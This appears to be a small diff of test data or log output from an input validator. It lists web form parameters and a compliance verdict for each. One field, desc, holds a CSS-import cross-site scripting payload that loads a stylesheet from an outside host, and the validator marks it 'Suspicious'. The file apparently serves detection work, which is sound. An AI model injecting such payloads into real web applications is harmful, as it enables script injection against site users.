@@ -1,0 +1,12 @@
+2016-07-17T18:25:31.005-06:00
+name : K5A''4  ' ' 3W8E..4.:H2.'  '
+desc : &lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt;
+end : 10.07.2016
+budget : 8,650
+company : -1
+assignto[] : 1
+assignme : 1
+The parameter: name :  having value: K5A''4  ' ' 3W8E..4.:H2.'  ' is: Compliant
+The parameter: desc :  having value: &lt;STYLE&gt;@import'http://ha.ckers.org/xss.css';&lt;/STYLE&gt; is: Suspicious
+The parameter: end :  having value: 10.07.2016 is: Compliant
+The parameter: budget :  having value: 8,650 is: Compliant
